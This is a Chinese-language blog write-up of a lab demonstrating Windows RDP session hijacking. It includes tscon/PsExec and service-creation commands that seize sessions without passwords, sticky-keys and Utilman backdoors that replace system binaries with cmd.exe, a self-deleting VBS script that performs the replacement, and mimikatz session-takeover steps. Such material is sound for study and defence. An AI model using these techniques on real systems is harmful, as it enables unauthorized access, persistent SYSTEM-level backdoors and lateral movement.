---
title: RDP劫持
layout: post
tags:
  - sec
  - hack
  - skills
  - windows
  - hijacking
category: 
  - hack
  - sec
  - skills
comments: true
share: true
description: RDP劫持思路，虽然攻击条件苛刻，但是也是一种好的思路。
---

RDP劫持思路，虽然攻击条件苛刻，但是也是一种好的思路。

* TOC
{:toc}

<!--more-->


## 引言


![](/img/hack/RDP/1505847834569.png)

打开任务管理器，连接administrator，不输入密码会出现错误

![](/img/hack/RDP/1505847892609.png)

攻击者可以通过远程桌面劫持，不需要metasploit、incognito、mimikatz等工具，使用内置命令进行劫持，本地高权限用户可以劫持任何已登录Windows用户会话，包括高权限的登录用户！每一个管理员都可以伪装成任何登录用户。虽然这个bug在由管理员权限的时候，什么用处，但是在管理员并不能访问某些用户系统的情况下是很有用的（比如银行某系统管理员通过远程桌面劫持财务系统的会话）

## 搭建域环境

**0x01 创建域控制器：**

更改计算机用户名：

![](/img/hack/RDP/1505976735553.png)

更改IP为静态IP，设置网关和DNS地址：

![](/img/hack/RDP/1505976996332.png)

选择服务器角色，添加AD域：

![](/img/hack/RDP/1505977299093.png)

运行dcpromo，在新林中新建域：

![](/img/hack/RDP/1505986689338.png)

![](/img/hack/RDP/1505977395856.png)

设置域名：

![](/img/hack/RDP/1505977451849.png)

然后一路默认设置，完成域控搭建。

**0x02 添加辅助域控制器**

前面搭建域控制器一样的步骤，只是在运行`dcpromo`之后，直接`向现有域添加域控制器`：


![](/img/hack/RDP/1505977451849.png)

然后填写刚才所建域名，一路默认安装，完成辅助域控制器的搭建

**0x03 添加域成员机器**

开始步骤和前面的一样，只是在属性中直接加入域，填写域名，输入域控的管理帐号

![](/img/hack/RDP/1505989777600.png)


**0x04 查看搭建情况**

在服务器管理器中查看域内机器：

![](/img/hack/RDP/1505990092052.png)

![](/img/hack/RDP/1505990212965.png)

![](/img/hack/RDP/1505990434191.png)



![](/img/hack/RDP/1505989945318.png)

**出现该错误情况，直接运行`Services.msc`进入服务，启动“Computer Brower”服务，若无法启动，请确认“Server”和“WorkStation”两项服务已开启，并设置“Computer Brower”服务属性为“手动启动”，禁止 “Windows FireWall”服务，关闭防火墙：**

![](/img/hack/RDP/1505990050019.png)


##  任务管理器实现：

查看运行的会话：

```c
query user
```

![](/img/hack/RDP/1505896290639.png)

使用psexec工具运行：

```c
PsExec.exe -s \\localhost -i console-ID cmd
```

![](/img/hack/RDP/1505896296547.png)

打开任务管理器，连接console会话的用户，无需密码即可切换登陆：

![console用户桌面](/img/hack/RDP/1505896305774.png)



## 命令行

**帮助文档:**

https://technet.microsoft.com/en-us/library/cc771505

![Alt text](/img/hack/RDP/1505896202865.png)


在使用PsExec之前，光使用tscon命令不会切换到对应的对话。在使用：

```c
PsExec.exe -s \\localhost cmd
```

之后，在NT AUTHORITY/SYSTEM下运行：

```c
tscon 会话ID /dest:console
```

![Alt text](/img/hack/RDP/1505899375811.png)

切换到对应的会话窗口：

![](/img/hack/RDP/1505899409546.png)

> 在多次实验之后，不能远程桌面登入到system用户的会话，只能切换远程机器的用户成为system 用户，原因未找到
> 
> 在域中实验情况也如上，只能将主机切换到syestem用户，连接的远程桌面不能切换为该用户的console，只有Administrator用户的rdp-tcp会话能切换为对应的console会话

![](/img/hack/RDP/1506046796446.png)


## 创建服务

**0x01执行命令：**

查询用户会话状态,获得会话id和会话名：

```c
query user
```

```c
wmic computersystem get domain
```

创建名为`sesshijack`服务：

```c
sc create sesshijack binpath= "cmd.exe /k tscon 需要劫持的会话ID /dest:当前用户会话名"
```

执行服务：

```
net start sesshijack
```

![](/img/hack/RDP/1506049347620.png)

**0x02实验结果：**

当前用户的会话和劫持的会话**互换**，劫持成功

![](/img/hack/RDP/1506049889935.png)


> 但是只有在管理员账户下才能进行劫持，在system用户下多次实验都未成功





## 横向运动

大多组织允许使用远程桌面访问内部网络，可以利用windows忘记密码解决方式进入网络组织内部，且自己是作为机器用户出现在日志之中。

暴力破解进行RDP登陆是下策，容易被发现

###  RDP后门——粘滞键

Windows由一个内置的`Sticky Keys`功能，在远程桌面登陆前的页面可以调出，且该功能是以SYSTEM权限运行。
“粘滞键”是为同时按下两个或更多个键有困难的人设计的。当快捷方式要求使用诸如 CTRL+ P等的组合键时，“粘滞键”允许用户按下修改键（CTRL、ALT或SHIFT）或 Windows徽标键之后，能保持这些键的活动状态直到按下其他键。打开“辅助功能选项”，在“键盘”选项卡的“粘滞键”项下，选中“使用粘滞键”复选框就可以了。
在Windows 2000/XP/Vista下，按SHIFT键5次，就可以打开粘滞键，实际上运行的是System32下的sethc.exe，而且在登录界面里也可以打开。这就让人联想到如果用cmd.exe覆盖sethc.exe，那么在登录界面按SHIFT键5次，就可以得到一个System权限的 cmdshell了。

由于Windows XP的保护机制，所有关键的系统文件都在System32下的dllcache里有备份。如果系统文件被修改了，Windows会马上将dllcache 里的备份复制过来，所以用cmd.exe覆盖sethc.exe之前，一定要将dllcache里的sethc.exe删除或重命名，否则是不会成功的。覆盖文件的时候，系统会弹出Windows文件保护提示，不用理它，点击“取消”就行了。用命令操作就是：

```
cd %widnir%\system32\dllcache
ren sethc.exe *.ex~
cd %widnir%\system32
copy /y cmd.exe sethc.exe
```

将命令写为VBS脚本，且脚本运行之后会自动删除：

```
On Error Resume Next
Dim obj, success
Set obj = CreateObject("WScript.Shell")
success = obj.run("cmd /c takeown /f %SystemRoot%\system32\sethc.exe&echo y| cacls %SystemRoot%\system32\sethc.exe /G %USERNAME%:F&copy %SystemRoot%\system32\cmd.exe %SystemRoot%\system32\acmd.exe&copy %SystemRoot%\system32\sethc.exe %SystemRoot%\system32\asethc.exe&del %SystemRoot%\system32\sethc.exe&ren %SystemRoot%\system32\acmd.exe sethc.exe", 0, True)
CreateObject("Scripting.FileSystemObject").DeleteFile(WScript.ScriptName)
```

![](/img/hack/RDP/1506225054417.png)


###  RDP后门——Utilman

在`windows/system`目录下将cmd.exe程序替换成Utilman.exe程序，在登陆界面，使用windows+U就能打开cmd（或者点击左下方）

![](/img/hack/RDP/1506230330135.png)


### 扫描RDP服务

安装环境：

```c
apt-get install xdotool imagemagick rdesktop bc
```

下载工具[sticky_keys_hunter](https://github.com/ztgrace/sticky_keys_hunter.git)（https://github.com/ztgrace/sticky_keys_hunter.git）

工作原理：

- 使用rdesktop连接到RDP
- 使用xdotool发送5次，触发sethc.exe后门
- 使用xdotool发送Windows + u来触发utilman.exe后门程序
- 截图
- 杀死RDP连接

使用：

```c
扫描单个主机： ./stickyKeysHunter.sh 192.168.1.10

扫描多台主机： for i in $(cat list.txt); do ./stickyKeysHunter.sh "${i}"; done
```


![](/img/hack/RDP/1506236014432.png)

### 使用mimikatz进行rdp会话劫持

运行mimikatz，输入`ts::sessions`：

![](/img/hack/RDP/1506240398148.png)


执行`ts::remote /id:1`会失败，在执行`privilege::debug`后，键入`token::elevate`，再执行`ts::remote /id:1`，rdp会话劫持成功：

![](/img/hack/RDP/1506240576492.png)



refer:https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6